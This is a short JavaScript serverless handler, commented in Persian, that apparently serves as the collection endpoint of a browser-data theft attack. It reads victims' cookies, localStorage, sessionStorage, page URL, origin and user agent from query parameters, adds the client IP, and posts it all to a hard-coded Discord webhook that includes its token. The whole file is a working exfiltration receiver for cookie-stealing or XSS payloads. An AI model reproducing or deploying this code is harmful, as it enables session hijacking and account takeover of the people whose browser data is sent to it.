// pages/index.js

exports.handler = async function (event, context) {
  const ip =
    event.headers['x-forwarded-for'] ||
    event.headers['client-ip'] ||
    event.headers['x-real-ip'] ||
    'unknown';

  const query = event.queryStringParameters;

  const log = {
    ip,
    cookies: query.cookies,
    localStorage: query.localStorage,
    sessionStorage: query.sessionStorage,
    url: query.url,
    origin: query.origin,
    userAgent: query.userAgent,
    timestamp: new Date().toISOString()
  };

  // ارسال به Webhook (مثلاً Discord)
  await fetch('https://discord.com/api/webhooks/1399581817883070607/w92ptejt9nVYWwswLdqWnRzEFYqLmzZPahHakz_6Q5HG0vsauID65LU1bydMDhiAil7I', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ content: '```json\n' + JSON.stringify(log, null, 2) + '\n```' })
  });

  return {
    statusCode: 200,
    body: 'Logged.'
  };
};


